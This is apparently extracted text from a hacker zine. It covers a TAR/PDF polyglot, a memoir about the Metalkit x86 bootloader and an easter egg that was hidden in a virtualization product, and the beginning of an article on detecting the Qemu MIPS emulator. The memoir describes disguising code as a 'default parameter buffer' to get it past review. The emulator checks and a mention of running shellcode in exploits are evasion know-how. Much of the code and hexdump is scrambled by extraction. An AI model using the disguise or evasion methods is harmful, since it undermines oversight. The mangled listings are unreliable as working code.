7 c = 0
6 If
the name is longer, something called a PaxHeader is used instead; we’ve come a long way since the 1950s, neighbors!
159
f o r i in h e a d e r :
c += ord ( i )
11 # S t o r e t h e u n s i g n e d i n t i n o c t a l , f o l l o w e d by NULL t h e n s p a c e .
f o r i , j in enumerate ( o c t ( c ) ) :
13
h e a d e r [ i + OFFSET ] = j
15 h e a d e r [ OFFSET + 6 ] = " \0 "
# The r e q u i r e d s p a c e was a l r e a d y t h e r e .
Now our TAR checksum is valid again, with an archived file name buffer that has been abused to contain
a valid PDF header and a stream object. Enjoy!
manul:pocorgtfo pastor$
0000000: 2550 4446 2d31
0000010: 2030 206f 626a
0000020: 6820 3830 3934
0000030: 7374 7265 616d
0000040: 0000 0000 0000
0000050: 0000 0000 0000
0000060: 0000 0000 3030
0000070: 3736 3400 3030
0000080: 3030 3030 3030
0000090: 3137 3200 3032
00000a0: 0000 0000 0000
00000b0: 0000 0000 0000
00000c0: 0000 0000 0000
00000d0: 0000 0000 0000
00000e0: 0000 0000 0000
00000f0: 0000 0000 0000
0000100: 0075 7374 6172
0000110: 0000 0000 0000
0000120: 0000 0000 0000
0000130: 6967 0000 0000
0000140: 0000 0000 0000
xxd pocorgtfo06.pdf
2e35 000a 25d4 c5d8
203c 3c0a 2f4c 656e
3732 2020 2020 0a3e
0a65 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
3030 3634 3400 3030
3031 3034 3000 3030
3000 3132 3431 3435
3031 3631 0020 3000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
2020 004d 616e 756c
0000 0000 0000 0000
0000 004c 6170 6872
0000 0000 0000 0000
0000 0000 0000 0000
| head -n 21
0a31 %PDF-1.5..%....1
6774
0 obj <<./Lengt
3e0a h 809472
.>>.
0000 stream.e........
0000 ................
0000 ................
3030 ....0000644.0000
3030 764.0001040.0000
3637 0000000.12414567
0000 172.020161. 0...
0000 ................
0000 ................
0000 ................
0000 ................
0000 ................
0000 ................
0000 .ustar .Manul..
0000 ................
6f61 .........Laphroa
0000 ig..............
0000 ................
P.S.: Sadly, that’s not all we needed to do. Just when we thought that our polyglot finally worked well
on all readers, it turned out that some further edits broke it on Preview.app, for no apparent reason, and
in a weird way. Namely, Preview.app wouldn’t display the contant width fonts in our PDF unless the PDF
signature was placed exactly at offset 0.
Choosing between our Apple readers not being able to enjoy this special issue, having to debug the
Preview.app, having to reinvent font storage, and missing our deadline, or putting the PDF signature back
at offset 0, we chose the latter. With luck, we’ll just sacrifice a single 512 byte block and one junk filename
to improve our PDF’s compatibility.
165
x86 Alchemy and Smuggling with Metalkit
by Micah Elizabeth Scott
Dear neighbors, today I humbly present a story of x86 alchemy and bit smuggling. It’s an MBR you can
take with you, the story of a lonely matryoshka egg, and a spark of something weird intentionally escaping
from a place where weird machines are by definition broken.
5.1
Pong test
Two or three lifetimes ago, I was an architect for the desktop USB and GPU virtualization subsystems at
VMware. Suffice to say, it was a complicated job handled by a small team of talented, dedicated, and fucking
crazy engineers. The story begins with our effort to find new engineers to hire that were just the right kind
of talented, dedicated, and crazy. We tried the usual tactics like looking for people who like the beers we
do or testing candidates on the minutiae of IEEE floating point in specific GPU configurations. When that
worked badly, we got creative. One of my coworkers made up an esoteric minimal instruction set and asked
candidates to write programs in it. This was fun for the interviewer, at least. I liked to run the programs in
my head and debug them as fast as the candidates wrote on the whiteboard.
One of my coworkers had a new plugin architecture for the part of our virtual machine runtime that
handles user input and 2D display compositing, and he suggested we use it as an interviewing tool. So
we had them play Pong. We developed a two-hour interview test where candidates wrote a plugin to play
against a trivial opponent. The virtual machine boots directly into the game in retro black & white. The
right paddle tracks the ball slowly. The left paddle is controlled by the mouse or keyboard. In the interview,
I would work through this ridiculous Rube Goldberg contraption with the candidate, giving them just barely
enough help so they’d succeed with the available time and materials. The process seemed to be quite good
at revealing the candidate’s approach toward the kind of ridiculous things we had to do on a daily basis.
To keep the difficulty level and time requirements appropriate, we needed the VM to generate very simple
and consistent screen updates. Any general purpose OS would have a time-consuming bootup process, and
the GPU commands would be littered with sporadic events that complicate the heuristics required to locate
the ball and send the right mouse movements to have the paddle follow it.
The required speed and the level of control ruled out any operating system I knew of, so I wrote my tiny
game to run on the virtual bare metal, communicating directly with the registers and command FIFO in
our virtual GPU to set up a 2D framebuffer and enqueue just the right update rectangles. We also vastly
simplified the interview problem by putting the mouse into absolute-coordinate mode using an extension
in our virtual hardware. The very first version used some bare metal support libraries that other teams
developed for automated testing of the ridiculously complicated virtual CPU, but I soon replaced those with
pieces from an open source bootloader and 32 bit x86 bare metal support library of my own.
5.2
Metalkit
This game worked well for our interview process. My library, named Metalkit, satisfied an acute personal itch
to write fiddly low-level code. I worked on my own time, hacking together dynamically generated interrupt
vector trampolines while my boyfriend hacked at repetitive monsters in World of Warcraft. At VMware, I
then forked a version of Metalkit into an open source library which would serve as public documentation
for the virtual GPU device and part of an internal unit testing framework for it. I wanted to release this
documentation with plenty of sample code. I ended up creating plenty of 3D rendering examples as a
byproduct of creating a low-level unit testing framework for our virtual GPU. When I needed an example for
the unaccelerated 2D dumb framebuffer mode, I ported my little PongOS to this library. This new version
could be open source, and very tiny.
Metalkit is optimized for creating tiny binaries. Partly it was a personal challenge, but a tiny binary is
often a teachable binary. Many a reader has had their first spark of curiosity for ELF after the inspiration
of an especially minimal or delicately obfuscated binary. It seemed didactically useful to have a tool for
17Figure 3: VMWare Pride
18creating bare-metal binaries that are fairly easy to compile and also where it can be easy to identify the
purpose of every byte in the file. Instead of using a large and complicated standard C library, it includes a
very minimal library that’s designed for readability, terseness, and a sense that it’s possible to understand
the whole system.
Readers who choose to study the internals of Metalkit may notice features that go to extremes in order
to avoid unnecessary or repetitive code while also allowing complex behaviors. The ISR trampolines, for
example, are tiny functions in RAM which wrap the C functions that handle each interrupt vector. These
C functions have a simple calling signature that allows a handler to access its vector number and prior
execution state as stack parameters. With the help of some macros, handler functions can inspect or write
this saved execution state to implement features like task switching. There’s a separate trampoline for each
interrupt vector, and to save space in the disk image they’re constructed in RAM during initialization by
following a repeating pattern:
60
68
b8
ff
58
8b
8d
83
fd
a5
a5
a5
61
8b
cf
2
4
6
8
10
12
14
<32 b i t arg>
<32 b i t addr>
d0
7 c 24 0 c
74 24 28
c7 08
64 24 e c
pusha
push
mov
call
pop
mov
lea
add
std
movsl
movsl
movsl
popa
mov
iret
; Save g e n e r a l −p u r p o s e r e g s
; C a l l handler ( arg )
<arg>
<addr >, %eax
∗%eax
%eax
12(%esp ) , %edi
40(%esp ) , %e s i
$8 , %edi
;
;
;
;
;
;
;
;
;
;
;
−20(%esp ) , %esp
Remove a r g from s t a c k
Load new s t a c k a d d r e s s
Addr o f e f l a g s on o l d s t a c k
Addr o f e f l a g s on new s t a c k
Copy b a c k w a r d s
Copy e f l a g s
Copy c s
Copy e i p
R e s t o r e g e n e r a l −p u r p o s e r e g s
Switch s t a c k s
R e s t o r e e i p , cs , e f l a g s
In the spirit of teaching someone to fish rather than handing them a can, I thought it prudent to set the
example of teaching machines to write the repetitive code, and how the runtime initialization might perform
this task more efficiently than the compiler could. Readers accustomed to the luxuries and tragedies of
ARM or x86-64 may need to adjust their spectacles to adequately behold the 32 bit ISR template above, as
excerpted from the comments in Metalkit’s intr.c module.
The most extreme example of design economy in Metalkit is the MBR. This 512 byte header is generated
and placed with the help of a custom linker script. It includes a plausible partition table and a carefully
crafted hunk of assembly that the BIOS will splat into low RAM and run for us in 16 bit Real Mode.
For convenience and ease of use as a teaching and testing tool, I wanted a minimal and highly convenient
bootloader. It should put the CPU into 32 bit mode, load a flat binary image into RAM, set up the execution
environment, and call main(). I wanted it to be an effortless result of typing make in a project, but to also
handle loading arbitrarily large images from devices like virtual CD-ROM drives and USB disks. Oh, and
we should make it boot from GRUB too.
5.3
Boot from anything in under 512 bytes
People never use the BIOS any more. System geeks spend all this time making sure it works in every
case, but nobody really notices. A modern BIOS has a huge library of available functionality. If you’ve
ever programmed in DOS, you’ve seen BIOS interrupts. 7 They’re like system calls, but with fewer rules.
Decades and decades of backward compatibility happened, all with layers of emulation so you can happily
keep calling interrupt 0x13 for WRITE DISK SECTORS without anyone but weird people like us worrying
that the data’s going to a solid state disk plugged into a hub on an xHCI USB 3.0 controller over PCIe
rather than to a hunk of spinning rust from 1980 on a 4 MHz parallel bus.
7 http://www.ctyme.com/intr/cat-003.htm
19There are a bunch of reasons not to use these routines in modern code, chiefly that they need to run
in 16 bit Real Mode, which can only address about the first megabyte of RAM. During the transition from
DOS to 32 bit operating systems, various strategies emerged for dealing with the fact that the drivers in the
PC’s BIOS only work in 16 bit mode. Usually the BIOS functionality is reimplemented entirely in the OS
for efficiency and maintainability, and this is feasible because the hardware is documented, standardized, or
interesting enough to get reverse engineered. There are exceptions for sure, like XFree86 running 16 bit VESA
BIOS video drivers in an emulator in order to run the GPU through proprietary mode switch sequences and
obtain framebuffer access.
Even a modern bootloader will pass up the chance to use the BIOS as soon as it can load its own driver.
GRUB has an MBR riddled with esoteric bug workarounds, its mission only to launch a 32 kiB or less stage2
binary from a prearranged sector on disk. The BIOS gained an unflattering reputation from decades of
buggy drivers and a penchant for claiming 640 kiB is enough RAM for anyone.
With Metalkit, we can try to move past that and see the BIOS as yet another niche where we can find
reusable gadgets. If we can stomach a switch to 16 bit Real Mode and back for each batch of sectors, we can
use the BIOS to read from the bootup disk (whatever stack of emulations that may be) into a small scratch
buffer below 640 kiB. Then, back in 32 bit Protected Mode, we shuttle that data up above 1 MB. Repeat
this enough times and we could load a whole CD-ROM into memory, 9 kiB at a time.
With the popularity these days of usermode programming and 64 bit portability it’s easy to forget entirely
that the CPU still knows how to execute 16 bit instructions. Of course, for compatibility it always starts in
16 bit mode, but typically a bootloader like GRUB will switch to 32 bit Protected Mode as soon as possible,
and nobody looks back. With the advent of UEFI, we even have a 64 bit replacement for BIOS.
You may remember that darling of the late 90s, VM86 mode. I remember such thrills from the vm86(2)
manpage when I first started monkeying with Linux. A system call to emulate 16 bit mode! In a sandbox!
Using a built-in CPU feature! It was part of Wine, part of X. Now it’s obsolete again, incompatible with
64 bit operating systems. We don’t need anything so glitzy for this job, though. Being a bootloader with
free rein of the processor’s GDT and segment descriptors, we can toggle off Protected Mode and reload
the segment registers to point them back at low memory. It can be tricky to debug code like this, but the
low-level debuggers in both VMware and Bochs let you examine the CPU state directly during these critical
mode switches.
Even our minimal and modern bootloader can’t escape all the woe and pageantry of backward compati-
bility. The first thing we do is switch on the A20 gate, which if you haven’t run across yet I would suggest you
save to look up next time you’d like to spend some meditative time crying and/or laughing into Wikipedia.
For each disk read, we prefer to use the more modern Logical Block Address (LBA) addressing mode,
where each disk sector has an index starting from zero like any sensible API would use. Of course, before
LBA, disks didn’t really have the API of a generic storage interface made from uniform and abstracted
20512-byte sectors; they had the API of a spinning magnetic stack and wubbling electronic wand, each with
a particular shape and speed. This older form of addressing was known as Cylinder Head Sector (CHS).
Metalkit will try LBA first, since it’s necessary for newer devices like USB sticks and CD-ROMs, with CHS
as a backup so that plain floppy disks work on any BIOS.
We read 18 sectors at a time, or 9 kiB. It’s the same as one old-style magnetic track on a 1.44 MiB disk,
to minimize the impact of CHS addressing on the size of the bootloader. After the BIOS returns, we have
to do our first jump to 32 bit Protected Mode to copy that block into place:
1
3
5
7
9
11
13
15
17
19
21
23
25
;
;
;
;
;
Enter P r o t e c t e d Mode , so we can copy t h i s s e c t o r t o
memory a b o v e t h e 1MB b o u n d a r y .
Note t h a t we r e s e t CS , DS, and ES ,
b u t we don ’ t modify t h e s t a c k a t a l l .
cli
lgdt
movl
orl
movl
ljmp
.code32
copy_enter32 :
movw
movw
movw
BIOS_PTR( bios_gdt_desc )
%cr0 , %eax
$1 , %eax
%eax , %cr0
$BOOT_CODE_SEG, $BIOS_PTR( copy_enter32 )
$BOOT_DATA_SEG, %ax
%ax , %ds
%ax , %es
;
; Copy t h e b u f f e r t o h i g h memory.
;
mov
$DISK_BUFFER, %e s i
mov
BIOS_PTR( d e s t _ a d d r e s s ) , %edi
mov
$ (DISK_BUFFER_SIZE / 4 ) , %ecx
rep movsl
The x86 architecture is full of features modern programmers prefer to sweep under the rug. The x86
segment registers are usually like this, vital in every DOS program but today unused aside from the inner
workings of thread-local storage, language runtimes, exception handlers, OpenGL APIs, and the like. We
may forget that these registers on x86 are actually a somewhat miraculous feat of backward-compatilogical
engineering starting with the 80286 design.
The original 8086 architecture included four 16 bit segment registers. Each one was padded out to 20
bits, functioning as a selectable base for code and data addressing calculations on a 16 bit machine that could
address a whole megabyte of RAM. In the 80286, the new Protected Mode was introduced. Instead of simple
arithmetic, the segment registers were now processed via a lookup table, the Local Descriptor Table (LDT).
This ancient hack introduced a magical quality to each segment register, remaining there inside every x86
to this day.
In this code segment, BOOT_DATA_SEG and BOOT_CODE_SEG are preprocessor macros that refer
to particular entries in descriptor tables we set up earlier in boot. In Protected Mode, these next instructions
contain some magic:
2
movw
movw
%ax , %ds
%ax , %es
Friends, what looks like a straightforward register-to-register mov is anything but. The guiding tenet
of Protected Mode is the fundamental right of abstraction for all segment registers. On an 8086, these
instructions would save a 16 bit value from %ax in the 16 bit registers %ds and %es. Later, during address
21calculations, the 16 bit value in the applicable segment register would be padded with zeroes on the right
and added to the relevant offset to form a 20 bit address that could reach an entire Megabyte of physical
memory. Protected Mode was a sort of Pandora’s box. With the box open, a segment register is now just
an idea, hopelessly modern and abstract, like the exact position of an electron. Writing an index to this
register is taken as an instruction to fetch a descriptor from the named table entry, populating some internal
and almost-invisible state variables within the processor.
After the copy, we reverse this machinery to descend back down to Real Mode and grab another 18 sectors.
With Protected Mode disabled, writing 0 to %ds and %es actually just sets the offset to a 16 bit value of zero
instead of loading from the descriptor table. There is a spooky in-between state nicknamed Unreal Mode
where it’s possible to be in real-mode with values lingering in the processor’s segment descriptors that could
only have been set by Protected Mode. I had some trouble with the BIOSes I tested, but all reliably operate
their disk and USB drivers in this state.
; 2 . D i s a b l e P r o t e c t e d Mode
2
4
movl
andl
movl
%cr0 , %eax
$ ( ~ 1 ) , %eax
%eax , %cr0
6
; 3 . Load r e a l −mode segment r e g i s t e r s . (CS , DS, ES)
8
10
12
xorw
movw
movw
ljmp
%ax , %ax
%ax , %ds
%ax , %es
$0 , $BIOS_PTR( disk_copy_loop )
Memory addressing may prove to be particularly mindboggling in an environment such as this. I wrote
the bootloader to use GNU’s assembler, which knows how to switch at any point between 16 bit and 32 bit
code. But, of course, I also need to use different addressing schemes for both of these modes, and there’s no
help from the compiler on this job. I use a collection of linker script calculations and preprocessor macros to
calculate 16 bit addresses, and I let the assembler assume 32 bit memory addresses everywhere. This works
out better anyway, since GNU binutils doesn’t help much when it comes to 16 bit anything.
The actual switch between 16 bit and 32 bit code is distinct from the switch to and from Protected Mode.
In fact, the CR0 bit that enables Protected Mode really just changes this segment loading behavior. The
other features we get, like segment limits, paging, and 32 bit code, are enabled with settings in the descriptors
we load via this new flavor of segment register we get in Protected Mode. The bitness actually changes when
we perform a long jump across segments after changing the segment descriptor for %cs and friends. To
orchestrate the change, we need the processor bitness, assembler bitness, and calculated addressing to all
line up just right:
2
ljmp
$BOOT_CODE_SEG, $BIOS_PTR( copy_enter32 )
.code32
copy_enter32 :
With these tricks, it’s possible to load an arbitrarily large next stage into RAM and execute it. This
could be a 6 kB Pong game, a 10 MB GPU unit test, Hello World, another bootloader stage, or maybe even
an operating system kernel.
Using the BIOS for disk input and a tiny bit of display output, and including the bare minimum amount of
backward-compatibility code, this functionality just barely fits into the 512 byte MBR. We even have room
for a real partition table. In the celebration and recognition of polyglots everywhere, a GNU Multiboot
header can sneak into any free 32 bytes within the first 8 kB and conveniently allow us to boot the image
directly from GRUB as well.
22Friends, think of Metalkit as My First 32 bit x86 Playset for Kids and Adults. I urge you, get the code
and write a round-robin thread scheduler with your teenager tonight. 8
5.4
Bug hunter
In the lopsided and sometimes oppressive culture of a rising Silicon Valley juggernaut, there were some small
subversions I took pride in. I was so productive and worked so much that I often chose my own side-projects
to mix things up a little. I’d fix little personal nitpicks. I’d look for security vulnerabilities. In my last year
there, I wrote a Bluetooth stack mostly to avoid boredom.
I once spent some time to implement oldschool CGA graphics mode emulation to fix a robot game I like.
It turns out that our BIOS had already inherited code to emulate these modes on top of VGA hardware.
So the BIOS was trying to get there by telling our virtual GPU to be a VGA device in a mode that’s
almost correct. Then the BIOS flips a bit in the VGA device telling it to interpret the framebuffer in CGA’s
particular planar style. This was the missing piece. I implemented a new blitter in the emulation that
handled this case, tested Robot Odyssey and Arcade Volleyball, and proudly resolved bug #3 in our tracker:
“CGA mode does not work.”
Along the way another bug caught my eye. #62382, “We don’t have any easter eggs in our products.”
It was filed back in 2005 by a platform engineer with a healthy sense of humor. The bug gained comments
from a range of people, from a curt “whatever” and temporary erasure to eventual revival and enthusiastic
support. To me, easter eggs were more than just a cute toy. They were a way of leaving a distinctly personal
artistic signature inside something that was intended to be a faceless commodity product. It was a subversion
I was happy to play a role in, and I figured PongOS was the perfect solution this time: small enough nobody
could complain about its size if anyone noticed it at all, isolated by the same sandbox we trust other VMs
inside, and I had a very subtle strategy for storing and triggering the disk image payload.
In the pressure to satisfy increasingly convoluted backward compatibility requirements, platform engineers
thrive by strategizing around and curating maps of undefined states. We specifically leave places where
behavior is not specified by the design, leaving subtle traps to discourage developers from fouling the pristinely
undefined by becoming reliant on our current unplanned placeholder behaviors.
I looked for a way to introduce an easter egg that could be triggered intentionally but which would stay
out of the way by only appearing in a state that I decided was safely in one of these formerly unfriendly
regions. The trigger I chose was a zero-byte floppy disk image attached to a desktop VM. This normally
wouldn’t do anything useful; there is no reason to have a zero-byte image attached instead of no image at
all, and booting in this state would lead to an error message from the BIOS.
The inner workings of this egg could be obscure as well. The floppy disk emulation was a crusty piece
of code few people would touch, and most of those who cared about and understood it had a lively sense
of humor and individuality. We routinely had to monkey-patch our zoo of devices around some obscure
operating system incompatibility. I wrote a patch that, as innocently as possible, included a header file with
6 kilobytes of hexadecimal data labeled as a “default parameter buffer,” the implication being that it helped
us in emulating some obscure floppy driver compatibility mode. When reading past the end of a floppy disk
image (very different from no image at all), we would read from this default buffer. With a zero-byte disk
image, we’re reading entirely from this buffer and booting into PongOS.
Friends who worked a little farther from the metal added to each of the platform-specific user interfaces
an obscure keyboard macro that would deploy a Paschal Ovum virtual machine with a zero-byte floppy
image.
5.5
Revision
The egg would always be controversial among the small but influential group inside the company who knew
about it. Many people could have prevented it from ever shipping, and indeed to some outsiders unfamiliar
8 git clone https://github.com/scanlime/metalkit
VMWare fork at http://vmware-svga.sourceforge.net/
23with the sausage-making process inherent in software development, it could seem strange that such whimsical
code would ever make it past the strict QA processes.
But it should be apparent to any developer and obvious to any security researcher that it’s impossible
to test for the absence of a feature like this, and in reality the complex systems software we all rely on
is so fiendishly complex that it’s possible nobody completely understands even a single OS kernel. Those
who come the closest to a complete understanding tend, in my experience, to have a jaded and pessimistic
view of kernels, device drivers, and communications stacks everywhere. The most jaded and curmudgeonly
would never want us to support graphics virtualization at all, and from a purely security position they would
probably be right.
In an unfortunate but probably inevitable string of events, someone inadvertently triggered the easter
egg on a VM that normally wouldn’t have booted, then they misunderstood the outcome and posted to the
forums about a “virus.” This eventually almost got the egg pulled, but we reached a compromise: I could
keep it if I added a VMware logo to the screen.
Now I had a challenge for myself. For starters, I’d create a new binary image that’s no larger than before,
with a nice looking logo. I wanted to go further, hiding an additional easter egg in the program. By carefully
pruning down and further optimizing the code in Metalkit, I saved entire kilobytes. I used a tiny 4 bit RLE
format for storing an anti-aliased logo image, and trimmed down all the math, graphics, and PCI code as
small as possible. The details are too numerous to list, but the intrepid reader will find the bytes in the
attached disk image number few enough to comfortably reverse engineer without too much despair.
For the nested easter egg, I added an obscure state machine to the keyboard ISR, toggling a drawing
mode when it detects the sequence of scancodes that make up {’p’,’r’,’i’,’d’,’e’}. With the special
drawing mode, a new color lookup table is activated and cycled when filling each scanline. I wanted this
layer of the egg to be a representation of the hidden struggles we go through and often keep to ourselves in
our work. And perhaps it was also a subtle nod to the specific rainbow in the Apple II logo, and the love
that myself and many of my coworkers recently put into creating our first virtualization product for the Mac.
5.6
Call to remix
Within this PDF, readers will find PongOS attached in the form of an Ableton sampler preset for those
who wish to, at various octaves, test their own perception for sonic-executable synesthesia in densely packed
uncompressed x86 code.
For other uses, rest assured a few lines of your favorite snake-based language are sufficient to make the
image suitable for boot or disassembly again.
1 >>>
>>>
3 >>>
>>>
5 >>>
import s t r u c t
a i f f = open ( " egg . a i f f " , " rb " ) . r e a d ( )
f l o a t s = s t r u c t . unpack ( " >6710 f " , a i f f )
b y t e s = [ c h r ( i n t ( ( i + 1 ) ∗ 1 2 8 ) ) f o r i in f l o a t s [ 3 6 : − 1 8 ] ]
open ( " egg . img " , "wb" ) . w r i t e ( " " . j o i n ( b y t e s ) )
7 −rw−r−−r−− 1 micah
staff
6656 Sep 20 0 0 : 0 7 egg . img
0 a 7 1 0 d 1 77 6 f 0 6 8 7 1 7 0b 7 d 5 4 7 c 1 d 7 03 5 4 d 6 b b a 5 4 8 egg . img
With or without the enclosed, I encourage you all to express yourself in ways nobody thinks possible.
Remember the old proverb: a wise explorer learns more about television with a magnet than a couch.
246
Detecting MIPS Emulation
by Craig Heffner
In this article, we’ll look at some handy tricks for detecting the difference between real MIPS hardware
and the Qemu emulator. First, in Section 6.1, we’ll look at special function registers whose values in the
emulator reveal the use of Qemu. Then, in Section 6.2, we’ll intentionally run code which has a pending
overwrite in the data cache to determine whether the instruction and data caches are synchronized with one
other, as they are in Qemu but are not in real hardware. The techniques presented in this article were tested
on Qemu v2.0.1.
6.1
Detection through hardware registers
Qemu can be identified with a reasonable level of certainty by examining discrepancies in the MIPS CP0
(Coprocessor0) registers. The most obvious register to examine is the PRId (Processor ID) register, shown
in Figure 4.
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
| Company Op t io ns |
Company ID |
CPU ID
|
Revision
|
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
4 QEMU
|0 0 0 0 0 0 0 0|0 0 0 0 0 0 0 1|1 0 0 0 0 0 1 1|0 0 0 0 0 0 0 0|
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
6 A t h e r o s AR7240 SoC | 0 0 0 0 0 0 0 0 | 0 0 0 0 0 0 0 1 | 1 0 0 1 0 0 1 1 | 0 1 1 1 0 1 0 0 |
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
8 R a l i n k RT3352F SoC | 0 0 0 0 0 0 0 0 | 0 0 0 0 0 0 0 1 | 1 0 0 1 0 1 1 0 | 0 1 0 0 1 1 0 0 |
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
2
Company Options
Company ID
CPU ID
Revision
Reserved for use by the manufacturer.
Uniquely identifies the manufacturer, but is set to 0 for older
processors as it was not defined in the MIPS specification.
Identifies the specific MIPS CPU type.
(MIPS 4KC, MIPS 24K, etc)
Used to specify the CPU core revision number.
Figure 4: Processor ID (PRId) Register
The PRId register can be read using the mfc0 (move from coprocessor0) instruction.
1 mfc0 $t0 , $15
; Move CP0 r e g i s t e r 15 ( PRId ) i n t o g e n e r a l p u r p o s e r e g i s t e r $ t 0
Figure 4 also shows the differences between Qemu and two common system-on-chip devices that are found
in real hardware. Note in particular the differences in the Revision field. Qemu sets this field to all zeros
regardless of which MIPS core is being emulated, but most real-world systems will have this field set to a
non-zero value representing the major/minor/patch version of the MIPS core in use by that CPU. 9
It is also useful to examine the Config register. Much like PRId, the Config register can be read using
the mfc0 instruction.
mfc0 $t0 , $16
9 Programming
; Move CP0 r e g i s t e r 16 ( C o n f i g ) i n t o g e n e r a l p u r p o s e r e g i s t e r $ t 0
the MIPS32 24K Core Family, Section 2.2
251
3
5
7
9
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
| |
|B|
|
|
|
|V|
|
|M|
Impl
| E | AT| AR | MT | 0 0 0 | I | K0 |
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
Qemu
|1 |0 0 0 0 0 0 0 0 0 0 0 0 0 0 0|1|0 0|0 0 0|0 1 1|0 0 0|0|0 1 0|
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
A t h e r o s 7240 SoC :
| 1| 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0|1|0 0|0 0 1|0 0 1|0 0 0|0|0 1 1|
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
R a l i n k RT3352F SoC : | 1 | 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 | 0 | 0 0 | 0 0 1 | 0 0 1 | 0 0 0 | 0 | 0 1 1 |
+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+ −+
M
Impl
BE
AT
AR
MT
0 0 0
VI
K0
1 if there is another config register. (Config1)
implementation specific.
1 if the processor is big endian, 0 for little endian.
Specifies whether the processor supports MIPS32 (0) or MIPS64
(1 == MIPS32 address map; 2 == full address map) encoding.
Architecture Revision level (0 == MIPS32/64 release 1; 1 == MIPS32/64 release 2).
Specifies the MMU type.
Unused
Set to 1 if the L1 instruction cache uses virtual tagging.
Specifies the MIPS kseg0 memory region’s caching behavior.
Figure 5: Config register
Again, we can find some general differences in register values between different CPUs, which are shown
in Figure 5. Most notably, Impl is zero in Qemu, while the Atheros and Ralink chips have this field set
to non-zero values. The PIC32 datasheet also notes that it uses these bits to store information regarding
segment caching and the SRAM bus interface. 10
These register variations are generally reliable, and are particularly applicable if you expect to only run
on one particular CPU, such as an exploit for a specific target.
6.2
Detection in Linux user space
Examining CPU hardware registers requires execution in kernel mode. But, for many Linux based MIPS
devices, you may be executing from Linux user space. Here, you may simply examine /proc/cpuinfo, which
in Qemu typically looks something like the following:
1 root@qemu:~# c a t / p r o c / c p u i n f o
system t y p e
: MIPS Malta
3 processor
: 0
cpu model
: MIPS 24Kc V0 . 0 FPU V0 . 0
5 BogoMIPS
: 2097.15
wait i n s t r u c t i o n
: yes
7 microsecond timers
: yes
tlb_entries
: 16
9 extra interrupt vector
: yes
hardware w a t c h p o i n t
: yes , count : 1 , a d d r e s s / i r w mask : [ 0 x 0 f f 8 ]
11 ASEs implemented
: mips16
shadow r e g i s t e r s e t s
: 1
13 c o r e
: 0
VCED e x c e p t i o n s
: not a v a i l a b l e
15 VCEI e x c e p t i o n s
: not a v a i l a b l e
10 PIC32
Reference Manual, 61113E.pdf
26First, most real MIPS systems will set system type to reflect the SoC vendor, such as “Ralink SoC”
or “Broadcom BCM5357 chip rev 2”. It would be extremely unlikely to see MIPS Malta on a production
system.
More importantly, BogoMIPS as reported in Qemu is a reflection of the host machine’s CPU speed. 2,097
BogoMIPS would be insane for a real MIPS processor, which typically clocks in around 400MHz. More
realistic BogoMIPS values for MIPS CPUs would be in the 200-300 range.
6.3
Execution-based detection
While the above detection methods are useful, they could easily be changed or patched, either by an end
user or in future Qemu releases. A far more reliable method of detection is through the use of fundamental
architecture features that are not properly emulated by Qemu and not easily implemented.
Qemu can be reliably detected by exploiting cache incoherency, which is inherent in MIPS CPUs but
absent from Qemu. 11
The MIPS cache is divided into two sections: one for instructions, and one for data. When data is written
to memory, that data is first stored in the data cache, and is eventually written back to main memory at a
later time. Instructions, as you may well guess, are cached in the instruction cache.
This is a common issue during MIPS exploitation. Let’s say that we write some shellcode to a buffer; that
shellcode is treated as data, and cached in the data cache. If we try to jump into that shellcode, however,
the CPU will go looking for it in the instruction cache; since it is not cached there, the CPU then fetches
the instructions from main memory. But the shellcode isn’t in main memory, it’s in the data cache!
This problem is typically mitigated by first flushing the data cache back to main memory before jumping
into the buffer containing the shellcode. Cache flushes can be performed explicitly in MIPS through the
synci or cache instructions, or by simply waiting a bit (e.g., sleep(1)) and letting the kernel do a cache
flush, which will typically need to happen periodically anyway.
Qemu does not even try to emulate this cache behavior, and we can use that to our advantage by
1) writing a block of code to an address in memory,
2) executing synci to make sure the code is written back from the data cache to main memory,
3) writing a second block of code to the same address in memory, and then
4) immediately jumping to the memory address.
When running on MIPS hardware, the second code block is still sitting in the data cache, and the first
block of code will be fetched from main memory and executed. However, in Qemu, since caching is not
emulated, the second code block will overwrite the first, and the second block of code will be executed.
Thus, we can execute two completely different sets of code from the same memory address; one piece of
code will be executed when running in Qemu, and the other piece of code will be executed when running on
real MIPS hardware:
1 /∗
